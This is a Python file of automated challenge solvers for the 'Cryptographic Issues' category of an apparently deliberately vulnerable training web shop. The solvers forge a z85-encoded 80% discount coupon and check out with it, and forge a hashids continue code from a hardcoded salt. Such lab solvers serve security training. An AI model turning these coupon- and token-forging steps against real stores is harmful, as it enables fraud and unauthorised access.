#!/usr/bin/env python3
"""Cryptographic Issues challenges."""
from __future__ import annotations

import datetime

from core import register_solver, Client, ok, warn, fail

CAT = "Cryptographic Issues"
_MONTHS = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]


@register_solver("weirdCryptoChallenge", "Weird Crypto (feedback)", CAT)
def weird_crypto(c: Client):
    r = c.add_feedback("The following libraries are bad for crypto: z85, base85, md5 and hashids", rating=3)
    ok(f"reported weak crypto libraries via feedback ({r.status_code})")


@register_solver("forgedCouponChallenge", "Forge an 80% discount coupon (z85)", CAT)
def forged_coupon(c: Client):
    try:
        from zmq.utils import z85
    except Exception:
        fail("pyzmq not installed (needed for z85) - run: pip install pyzmq")
        return
    today = datetime.date.today()
    plaintext = f"{_MONTHS[today.month - 1]}{str(today.year)[2:]}-80"   # e.g. JUL26-80
    coupon = z85.encode(plaintext.encode()).decode()
    # apply the forged coupon to a real basket and check out
    c.ensure_user("coupon_solver@test.local", "Password1!")
    c.post("/api/BasketItems/", json={"BasketId": c.bid, "ProductId": 1, "quantity": 1})
    ap = c.put(f"/rest/basket/{c.bid}/coupon/{coupon}")
    disc = ap.json().get("discount") if ap.headers.get("content-type", "").startswith("application/json") else "?"
    co = c.post(f"/rest/basket/{c.bid}/checkout", json={"couponData": coupon})
    ok(f"applied forged coupon {coupon} (discount={disc}) and checked out ({co.status_code})")


@register_solver("continueCodeChallenge", "Forge a continue code (hashids -> id 999)", CAT)
def continue_code(c: Client):
    try:
        from hashids import Hashids
    except Exception:
        fail("hashids not installed - run: pip install hashids")
        return
    h = Hashids(salt="this is my salt", min_length=60,
                alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")
    code = h.encode(999)
    r = c.put(f"/rest/continue-code/apply/{code}")
    ok(f"applied forged continue code containing id 999 ({r.status_code})")
